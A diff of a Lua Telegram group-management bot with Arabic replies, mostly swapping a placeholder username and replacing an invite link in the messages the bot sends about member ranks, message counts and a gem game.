+send(msg.chat_id_, msg.id_,'\n܁༯┆ العضو ▸ ['..data.first_name_..'](t.me/'..(data.username_ or 'xxxs_x')..')'..'\n܁༯┆ تم رفعه '..RTPA..' هنا\n')   
 redis:set(ToReDo.."Comd:New:rt:user:"..msg.chat_id_..result.sender_user_id_,RTPA)
 redis:sadd(ToReDo..'Mod:User'..msg.chat_id_,result.sender_user_id_)  
 elseif blakrt == 'مدير' and Constructor(msg) then
-send(msg.chat_id_, msg.id_,'\n܁༯┆ العضو ▸ ['..data.first_name_..'](t.me/'..(data.username_ or 'xxxc_x')..')'..'\n܁༯┆ تم رفعه '..RTPA..' هنا\n')   
+send(msg.chat_id_, msg.id_,'\n܁༯┆ العضو ▸ ['..data.first_name_..'](t.me/'..(data.username_ or 'xxxs_x')..')'..'\n܁༯┆ تم رفعه '..RTPA..' هنا\n')   
 redis:set(ToReDo.."Comd:New:rt:user:"..msg.chat_id_..result.sender_user_id_,RTPA)  
 redis:sadd(ToReDo..'Owners'..msg.chat_id_,result.sender_user_id_)  
 elseif blakrt == 'عضو' and Mod(msg) then
-send(msg.chat_id_, msg.id_,'\n܁༯┆ العضو ▸ ['..data.first_name_..'](t.me/'..(data.username_ or 'xxxc_x')..')'..'\n܁༯┆ تم رفعه '..RTPA..' هنا\n')   
+send(msg.chat_id_, msg.id_,'\n܁༯┆ العضو ▸ ['..data.first_name_..'](t.me/'..(data.username_ or 'xxxs_x')..')'..'\n܁༯┆ تم رفعه '..RTPA..' هنا\n')   
 end
 end,nil)   
 end   
@@ -5025,19 +5029,19 @@ function by_reply(extra, result, success)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
 local blakrt = redis:get(ToReDo.."Comd:New:rt:bot:"..RTPA..msg.chat_id_)
 if blakrt == 'مميز' and Mod(msg) then
-send(msg.chat_id_, msg.id_,'\n܁༯┆ العضو ▸ ['..data.first_name_..'](t.me/'..(data.username_ or 'xxxc_x')..')'..'\n܁༯┆ تم تنزيله من '..RTPA..' هنا\n')   
+send(msg.chat_id_, msg.id_,'\n܁༯┆ العضو ▸ ['..data.first_name_..'](t.me/'..(data.username_ or 'xxxs_x')..')'..'\n܁༯┆ تم تنزيله من '..RTPA..' هنا\n')   
 redis:srem(ToReDo..'Vips:User'..msg.chat_id_,result.sender_user_id_)  
 redis:del(ToReDo.."Comd:New:rt:user:"..msg.chat_id_..result.sender_user_id_)
 elseif blakrt == 'ادمن' and Owners(msg) then 
-send(msg.chat_id_, msg.id_,'\n܁༯┆ العضو ▸ ['..data.first_name_..'](t.me/'..(data.username_ or 'xxxc_x')..')'..'\n܁༯┆ تم تنزيله من '..RTPA..' هنا\n')   
+send(msg.chat_id_, msg.id_,'\n܁༯┆ العضو ▸ ['..data.first_name_..'](t.me/'..(data.username_ or 'xxxs_x')..')'..'\n܁༯┆ تم تنزيله من '..RTPA..' هنا\n')   
 redis:srem(ToReDo..'Mod:User'..msg.chat_id_,result.sender_user_id_) 
 redis:del(ToReDo.."Comd:New:rt:user:"..msg.chat_id_..result.sender_user_id_)
 elseif blakrt == 'مدير' and Constructor(msg) then
-send(msg.chat_id_, msg.id_,'\n܁༯┆ العضو ▸ ['..data.first_name_..'](t.me/'..(data.username_ or 'xxxc_x')..')'..'\n܁༯┆ تم تنزيله من '..RTPA..' هنا\n')   
+send(msg.chat_id_, msg.id_,'\n܁༯┆ العضو ▸ ['..data.first_name_..'](t.me/'..(data.username_ or 'xxxs_x')..')'..'\n܁༯┆ تم تنزيله من '..RTPA..' هنا\n')   
 redis:srem(ToReDo..'Owners'..msg.chat_id_,result.sender_user_id_)  
 redis:del(ToReDo.."Comd:New:rt:user:"..msg.chat_id_..result.sender_user_id_)
 elseif blakrt == 'عضو' and Mod(msg) then
-send(msg.chat_id_, msg.id_,'\n܁༯┆ العضو ▸ ['..data.first_name_..'](t.me/'..(data.username_ or 'xxxc_x')..')'..'\n܁༯┆ تم تنزيله من '..RTPA..' هنا\n')   
+send(msg.chat_id_, msg.id_,'\n܁༯┆ العضو ▸ ['..data.first_name_..'](t.me/'..(data.username_ or 'xxxs_x')..')'..'\n܁༯┆ تم تنزيله من '..RTPA..' هنا\n')   
 end
 end,nil)   
 end   
@@ -5055,19 +5059,19 @@ function py_username(extra, result, success)
 if result.id_ then
 local blakrt = redis:get(ToReDo.."Comd:New:rt:bot:"..text1[2]..msg.chat_id_)
 if blakrt == 'مميز' and Mod(msg) then
-send(msg.chat_id_, msg.id_,'\n܁༯┆ العضو ▸ ['..result.title_..'](t.me/'..(text1[3] or 'xxxc_x')..')'..'\n܁༯┆ تم رفعه '..text1[2]..' هنا')   
+send(msg.chat_id_, msg.id_,'\n܁༯┆ العضو ▸ ['..result.title_..'](t.me/'..(text1[3] or 'xxxs_x')..')'..'\n܁༯┆ تم رفعه '..text1[2]..' هنا')   
 redis:sadd(ToReDo..'Vips:User'..msg.chat_id_,result.id_)  
 redis:set(ToReDo.."Comd:New:rt:user:"..msg.chat_id_..result.id_,text1[2])
 elseif blakrt == 'ادمن' and Owners(msg) then 
-send(msg.chat_id_, msg.id_,'\n܁༯┆ العضو ▸ ['..result.title_..'](t.me/'..(text1[3] or 'xxxc_x')..')'..'\n܁༯┆ تم رفعه '..text1[2]..' هنا')   
+send(msg.chat_id_, msg.id_,'\n܁༯┆ العضو ▸ ['..result.title_..'](t.me/'..(text1[3] or 'xxxs_x')..')'..'\n܁༯┆ تم رفعه '..text1[2]..' هنا')   
 redis:sadd(ToReDo..'Mod:User'..msg.chat_id_,result.id_)  
 redis:set(ToReDo.."Comd:New:rt:user:"..msg.chat_id_..result.id_,text1[2])
 elseif blakrt == 'مدير' and Constructor(msg) then
-send(msg.chat_id_, msg.id_,'\n܁༯┆ العضو ▸ ['..result.title_..'](t.me/'..(text1[3] or 'xxxc_x')..')'..'\n܁༯┆ تم رفعه '..text1[2]..' هنا')   
+send(msg.chat_id_, msg.id_,'\n܁༯┆ العضو ▸ ['..result.title_..'](t.me/'..(text1[3] or 'xxxs_x')..')'..'\n܁༯┆ تم رفعه '..text1[2]..' هنا')   
 redis:sadd(ToReDo..'Owners'..msg.chat_id_,result.id_)  
 redis:set(ToReDo.."Comd:New:rt:user:"..msg.chat_id_..result.id_,text1[2])
 elseif blakrt == 'عضو' and Mod(msg) then
-send(msg.chat_id_, msg.id_,'\n܁༯┆ العضو ▸ ['..result.title_..'](t.me/'..(text1[3] or 'xxxc_x')..')'..'\n܁༯┆ تم رفعه '..text1[2]..' هنا')   
+send(msg.chat_id_, msg.id_,'\n܁༯┆ العضو ▸ ['..result.title_..'](t.me/'..(text1[3] or 'xxxs_x')..')'..'\n܁༯┆ تم رفعه '..text1[2]..' هنا')   
 end
 else
 info = '܁༯┆ المعرف غلط'
@@ -5088,19 +5092,19 @@ function py_username(extra, result, success)
 if result.id_ then
 local blakrt = redis:get(ToReDo.."Comd:New:rt:bot:"..text1[2]..msg.chat_id_)
 if blakrt == 'مميز' and Mod(msg) then
-send(msg.chat_id_, msg.id_,'\n܁༯┆ العضو ▸ ['..result.title_..'](t.me/'..(text1[3] or 'xxxc_x')..')'..'\n܁༯┆ تم تنريله من '..text1[2]..' هنا')   
+send(msg.chat_id_, msg.id_,'\n܁༯┆ العضو ▸ ['..result.title_..'](t.me/'..(text1[3] or 'xxxs_x')..')'..'\n܁༯┆ تم تنريله من '..text1[2]..' هنا')   
 redis:srem(ToReDo..'Vips:User'..msg.chat_id_,result.id_)  
 redis:del(ToReDo.."Comd:New:rt:user:"..msg.chat_id_..result.id_)
 elseif blakrt == 'ادمن' and Owners(msg) then 
-send(msg.chat_id_, msg.id_,'\n܁༯┆ العضو ▸ ['..result.title_..'](t.me/'..(text1[3] or 'xxxc_x')..')'..'\n܁༯┆ تم تنريله من '..text1[2]..' هنا')   
+send(msg.chat_id_, msg.id_,'\n܁༯┆ العضو ▸ ['..result.title_..'](t.me/'..(text1[3] or 'xxxs_x')..')'..'\n܁༯┆ تم تنريله من '..text1[2]..' هنا')   
 redis:srem(ToReDo..'Mod:User'..msg.chat_id_,result.id_)  
 redis:del(ToReDo.."Comd:New:rt:user:"..msg.chat_id_..result.id_)
 elseif blakrt == 'مدير' and Constructor(msg) then
-send(msg.chat_id_, msg.id_,'\n܁༯┆ العضو ▸ ['..result.title_..'](t.me/'..(text1[3] or 'xxxc_x')..')'..'\n܁༯┆ تم تنريله من '..text1[2]..' هنا')   
+send(msg.chat_id_, msg.id_,'\n܁༯┆ العضو ▸ ['..result.title_..'](t.me/'..(text1[3] or 'xxxs_x')..')'..'\n܁༯┆ تم تنريله من '..text1[2]..' هنا')   
 redis:srem(ToReDo..'Owners'..msg.chat_id_,result.id_)  
 redis:del(ToReDo.."Comd:New:rt:user:"..msg.chat_id_..result.id_)
 elseif blakrt == 'عضو' and Mod(msg) then
-send(msg.chat_id_, msg.id_,'\n܁༯┆ العضو ▸ ['..result.title_..'](t.me/'..(text1[3] or 'xxxc_x')..')'..'\n܁༯┆ تم تنريله من '..text1[2]..' هنا')   
+send(msg.chat_id_, msg.id_,'\n܁༯┆ العضو ▸ ['..result.title_..'](t.me/'..(text1[3] or 'xxxs_x')..')'..'\n܁༯┆ تم تنريله من '..text1[2]..' هنا')   
 end
 else
 info = '܁༯┆ المعرف غلط'
@@ -5119,7 +5123,7 @@ if AddChannel(msg.sender_user_id_) == false then
 send(msg.chat_id_, msg.id_,'- هلو حب ، لايمكنك استخدام البوت 💕.\n- ﭑشترك اولاً 💕 • ['..redis:get(ToReDo..'add:ch:username')..'] .')
 return false
 end
-send(msg.chat_id_, msg.id_,'܁༯┆عدد رسائل الحلو ◃ ['..redis:get(ToReDo..'Msg_User'..msg.chat_id_..':'..msg.sender_user_id_)..'](https://t.me/joinchat/AAAAAEvr1yqOypm-uHojPA) 💞 ܰ' ) 
+send(msg.chat_id_, msg.id_,'܁༯┆عدد رسائل الحلو ◃ ['..redis:get(ToReDo..'Msg_User'..msg.chat_id_..':'..msg.sender_user_id_)..'](t.me/xxxs_x) 💞 ܰ' ) 
 end 
 if text == 'تفعيل الاذاعه' and Sudo_ToReDo(msg) then  
 if redis:get(ToReDo..'Bc:Bots') then
@@ -5198,7 +5202,7 @@ for i=1,tonumber(num) do
 DeleteMessage(msg.chat_id_, {[0] = msgm})
 msgm = msgm - 1048576
 end
-send(msg.chat_id_,msg.id_,'┐ هلو عمري 💞 ٭ \n┘ تم تنظيف ◞ ['..num..'](https://t.me/joinchat/AAAAAEvr1yqOypm-uHojPA) ◜ رسالة ✓ ٭')
+send(msg.chat_id_,msg.id_,'┐ هلو عمري 💞 ٭ \n┘ تم تنظيف ◞ ['..num..'](t.me/xxxs_x) ◜ رسالة ✓ ٭')
 end
 if text == "تغير اسم البوت" or text == "تغيير اسم البوت" then 
 if Sudo_ToReDo(msg) then
@@ -5346,7 +5350,7 @@ if redis:sismember(ToReDo..'Vips:User'..msg.chat_id_, result.sender_user_id_) th
 vip = ' مميز ،' else vip = ''
 end
 if Can_or_NotCan(result.sender_user_id_,msg.chat_id_) ~= false then
-send(msg.chat_id_, msg.id_,"\n܁༯┆هلو عمري 💞 ܰ\n܁༯┆تم تنزيل [العضو](https://t.me/joinchat/AAAAAEvr1yqOypm-uHojPA) 💞 ܰ\n܁༯┆ ܊  "..dev..''..crr..''..cr..''..own..''..mod..''..vip.." ܊\n")
+send(msg.chat_id_, msg.id_,"\n܁༯┆هلو عمري 💞 ܰ\n܁༯┆تم تنزيل [العضو](t.me/xxxs_x) 💞 ܰ\n܁༯┆ ܊  "..dev..''..crr..''..cr..''..own..''..mod..''..vip.." ܊\n")
 else
 send(msg.chat_id_, msg.id_,"\n܁༯┆ليس لديةه رتب حتئ استطيع تنزيل 😹😭💞 ܰ  \n")
 end
@@ -5475,7 +5479,7 @@ end
 end
 if text and text:match("^(.*)$") then
 if redis:get(ToReDo..'Set:Rd'..msg.sender_user_id_..':'..msg.chat_id_) == 'true' then
-send(msg.chat_id_, msg.id_,'܁༯┆ارسل الرد الذي تريده 💞 ܰ\n܁༯┆سواء كان ▿\n܁༯┆[صوره](https://t.me/joinchat/AAAAAEvr1yqOypm-uHojPA) ܊ [بصمه](https://t.me/joinchat/AAAAAEvr1yqOypm-uHojPA) ܊ [فيد](https://t.me/joinchat/AAAAAEvr1yqOypm-uHojPA) ܊ [متحركه](https://t.me/joinchat/AAAAAEvr1yqOypm-uHojPA) ܊ [ملصق](https://t.me/joinchat/AAAAAEvr1yqOypm-uHojPA) ܰ')
+send(msg.chat_id_, msg.id_,'܁༯┆ارسل الرد الذي تريده 💞 ܰ\n܁༯┆سواء كان ▿\n܁༯┆[صوره](t.me/xxxs_x) ܊ [بصمه](t.me/xxxs_x) ܊ [فيد](t.me/xxxs_x) ܊ [متحركه](t.me/xxxs_x) ܊ [ملصق](t.me/xxxs_x) ܰ')
 redis:set(ToReDo..'Set:Rd'..msg.sender_user_id_..':'..msg.chat_id_, 'true1')
 redis:set(ToReDo..'Text:Sudo:Bot'..msg.sender_user_id_..':'..msg.chat_id_, text)
 redis:sadd(ToReDo..'List:Rd:Sudo', text)
@@ -5651,7 +5655,7 @@ end
 end
 if text and text:match("^(.*)$") then
 if redis:get(ToReDo..'Set:Owners:rd'..msg.sender_user_id_..':'..msg.chat_id_) == 'true' then
-send(msg.chat_id_, msg.id_,'܁༯┆ارسل الرد الذي تريده 💞 ܰ\n܁༯┆سواء كان ▿\n܁༯┆[صوره](https://t.me/joinchat/AAAAAEvr1yqOypm-uHojPA) ܊ [بصمه](https://t.me/joinchat/AAAAAEvr1yqOypm-uHojPA) ܊ [فيد](https://t.me/joinchat/AAAAAEvr1yqOypm-uHojPA) ܊ [متحركه](https://t.me/joinchat/AAAAAEvr1yqOypm-uHojPA) ܊ [ملصق](https://t.me/joinchat/AAAAAEvr1yqOypm-uHojPA) ܰ')
+send(msg.chat_id_, msg.id_,'܁༯┆ارسل الرد الذي تريده 💞 ܰ\n܁༯┆سواء كان ▿\n܁༯┆[صوره](t.me/xxxs_x) ܊ [بصمه](t.me/xxxs_x) ܊ [فيد](t.me/xxxs_x) ܊ [متحركه](t.me/xxxs_x) ܊ [ملصق](t.me/xxxs_x) ܰ')
 redis:set(ToReDo..'Set:Owners:rd'..msg.sender_user_id_..':'..msg.chat_id_,'true1')
 redis:set(ToReDo..'Text:Owners'..msg.sender_user_id_..':'..msg.chat_id_, text)
 redis:del(ToReDo.."Add:Rd:Owners:Gif"..text..msg.chat_id_)   
@@ -6316,7 +6320,7 @@ local Num = tonumber(redis:get(ToReDo..'Add:Contact'..msg.chat_id_..':'..msg.sen
 if Num == 0 then 
 Text = '܁༯┆ماعدكك جهات 😹😔💞'
 else
-Text = '܁༯┆عدد جهاتك المضافة ˼ ['..Num..'](https://t.me/joinchat/AAAAAEvr1yqOypm-uHojPA) ˹'
+Text = '܁༯┆عدد جهاتك المضافة ˼ ['..Num..'](t.me/xxxs_x) ˹'
 end
 send(msg.chat_id_, msg.id_,Text) 
 end
@@ -6343,7 +6347,7 @@ if sendok == 0 then
 send(msg.chat_id_, msg.id_,'܁༯┆لا يوجد مشتركين وهميين في البوت 💞 ܰ  \n')   
 else
 local ok = #pv - sendok
-send(msg.chat_id_, msg.id_,'܁༯┆ عدد المشتركين ◃ ['..#pv..'](https://t.me/joinchat/AAAAAEvr1yqOypm-uHojPA) ܰ\n܁༯┆تم ازالة ◃ ['..sendok..'](https://t.me/joinchat/AAAAAEvr1yqOypm-uHojPA) " من المشتركين  \n܁༯┆عدد المشتركين الحقيقي ◃ ['..ok..'](https://t.me/joinchat/AAAAAEvr1yqOypm-uHojPA) " مشترك\n')   
+send(msg.chat_id_, msg.id_,'܁༯┆ عدد المشتركين ◃ ['..#pv..'](t.me/xxxs_x) ܰ\n܁༯┆تم ازالة ◃ ['..sendok..'](t.me/xxxs_x) " من المشتركين  \n܁༯┆عدد المشتركين الحقيقي ◃ ['..ok..'](t.me/xxxs_x) " مشترك\n')   
 end
 end
 end,nil)
@@ -6388,12 +6392,12 @@ local sendok = #group - ToReDo
 if q == 0 then
 ToReDo = ''
 else
-ToReDo = '\n܁༯┆ تم ازالة ['..q..'](https://t.me/joinchat/AAAAAEvr1yqOypm-uHojPA) مجموعات من البوت 💞 ܰ'
+ToReDo = '\n܁༯┆ تم ازالة ['..q..'](t.me/xxxs_x) مجموعات من البوت 💞 ܰ'
 end
 if w == 0 then
 ToReDoh = ''
 else
-ToReDoh = '\n܁༯┆ تم ازالة ['..w..'](https://t.me/joinchat/AAAAAEvr1yqOypm-uHojPA) مجموعات من البوت 💞 ܰ'
+ToReDoh = '\n܁༯┆ تم ازالة ['..w..'](t.me/xxxs_x) مجموعات من البوت 💞 ܰ'
 end
 send(msg.chat_id_, msg.id_,'܁༯┆تم تنظيف المجموعات💞 ܰ')   
 end
@@ -6418,7 +6422,7 @@ local numadded = string.match(text, "(%d+)")
 local iduserr = redis:get(ToReDo..'id:user'..msg.chat_id_)  
 redis:del(ToReDo..'Msg_User'..msg.chat_id_..':'..msg.sender_user_id_) 
 redis:incrby(ToReDo..'Msg_User'..msg.chat_id_..':'..iduserr,numadded)  
-send(msg.chat_id_, msg.id_,"\n٭ 𖤓┆تم اضافة ◞ ["..numadded..'](https://t.me/joinchat/AAAAAEvr1yqOypm-uHojPA) ◜ من الرسائل 💞 ٭')  
+send(msg.chat_id_, msg.id_,"\n٭ 𖤓┆تم اضافة ◞ ["..numadded..'](t.me/xxxs_x) ◜ من الرسائل 💞 ٭')  
 end
 ------------------------------------------------------------------------
 if redis:get(ToReDo.."gemadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
@@ -6455,7 +6459,7 @@ if text and text:match("^اضف مجوهرات (%d+)$") and msg.reply_to_message
 local Num = text:match("^اضف مجوهرات (%d+)$")
 function reply(extra, result, success)
 redis:incrby(ToReDo..'NUM:GAMES'..msg.chat_id_..result.sender_user_id_,Num)  
-send(msg.chat_id_, msg.id_,"┐ هلو عمري 💞 ٭ \n┘ تم اضافة ◞ ["..Num..'](https://t.me/joinchat/AAAAAEvr1yqOypm-uHojPA) ◜ مجوهرات ✓ ٭')  
+send(msg.chat_id_, msg.id_,"┐ هلو عمري 💞 ٭ \n┘ تم اضافة ◞ ["..Num..'](t.me/xxxs_x) ◜ مجوهرات ✓ ٭')  
 end
 tdcli_function ({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},reply, nil)
 return false
@@ -6475,7 +6479,7 @@ local Num = text:match("^اضف رسائل (%d+)$")
 function reply(extra, result, success)
 redis:del(ToReDo..'Msg_User'..msg.chat_id_..':'..result.sender_user_id_) 
 redis:incrby(ToReDo..'Msg_User'..msg.chat_id_..':'..result.sender_user_id_,Num)  
-send(msg.chat_id_, msg.id_, "\n٭ 𖤓┆تم اضافة ◞ ["..num..'](https://t.me/joinchat/AAAAAEvr1yqOypm-uHojPA) ◜ من الرسائل 💞 ٭')  
+send(msg.chat_id_, msg.id_, "\n٭ 𖤓┆تم اضافة ◞ ["..num..'](t.me/xxxs_x) ◜ من الرسائل 💞 ٭')  
 end
 tdcli_function ({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},reply, nil)
 return false
@@ -6489,7 +6493,7 @@ local Num = redis:get(ToReDo..'NUM:GAMES'..msg.chat_id_..msg.sender_user_id_) or
 if Num == 0 then 
 Text = '٭ 𖤓┆لم تلعب اي لعبة للحصول على المجوهرات ☓◜'
 else
-Text = '٭ 𖤓┆عدد مجوهراتك ◃ ◞ ['..Num..'](https://t.me/joinchat/AAAAAEvr1yqOypm-uHojPA) ◜.'
+Text = '٭ 𖤓┆عدد مجوهراتك ◃ ◞ ['..Num..'](t.me/xxxs_x) ◜.'
 end
 send(msg.chat_id_, msg.id_,Text) 
 end
@@ -6500,7 +6504,7 @@ send(msg.chat_id_, msg.id_,'- هلو حب ، لايمكنك استخدام ال�
 return false
 end
 if tonumber(NUMPY) == tonumber(0) then
-send(msg.chat_id_,msg.id_,"\n✥┆لا تستطيع البيع اقل من ◞[1](https://t.me/joinchat/AAAAAEvr1yqOypm-uHojPA)◜ ◃") 
+send(msg.chat_id_,msg.id_,"\n✥┆لا تستطيع البيع اقل من ◞[1](t.me/xxxs_x)◜ ◃") 
 return false 
 end
 if tonumber(redis:get(ToReDo..'NUM:GAMES'..msg.chat_id_..msg.sender_user_id_)) == tonumber(0) then
@@ -6514,7 +6518,7 @@ end
 local NUMNKO = (NUMPY * 50)
 redis:decrby(ToReDo..'NUM:GAMES'..msg.chat_id_..msg.sender_user_id_,NUMPY)  
 redis:incrby(ToReDo..'Msg_User'..msg.chat_id_..':'..msg.sender_user_id_,NUMNKO)  
-send(msg.chat_id_,msg.id_,'┐ تم خصم ◞['..NUMPY..'](https://t.me/joinchat/AAAAAEvr1yqOypm-uHojPA)◜ من مجوهراتك ✓ ٭\n┘ تم اضافة ◞['..(NUMPY * 50)..'](https://t.me/joinchat/AAAAAEvr1yqOypm-uHojPA)◜ رسالة الى رسائلك ✓ ٭')
+send(msg.chat_id_,msg.id_,'┐ تم خصم ◞['..NUMPY..'](t.me/xxxs_x)◜ من مجوهراتك ✓ ٭\n┘ تم اضافة ◞['..(NUMPY * 50)..'](t.me/xxxs_x)◜ رسالة الى رسائلك ✓ ٭')
 end 
 return false 
 end
@@ -6922,7 +6926,7 @@ tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,
 if data.username_ ~= false then
 send(msg.chat_id_,0,"⚠┇العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n🚫┇["..ToReDoAbot.."] \n") 
 else
-send(msg.chat_id_,0,"⚠┇العضو : {["..data.first_name_.."](T.ME/xxxc_x)}\n🚫┇["..ToReDoAbot.."] \n") 
+send(msg.chat_id_,0,"⚠┇العضو : {["..data.first_name_.."](T.ME/xxxs_x)}\n🚫┇["..ToReDoAbot.."] \n") 
 end
 end,nil)   
 DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
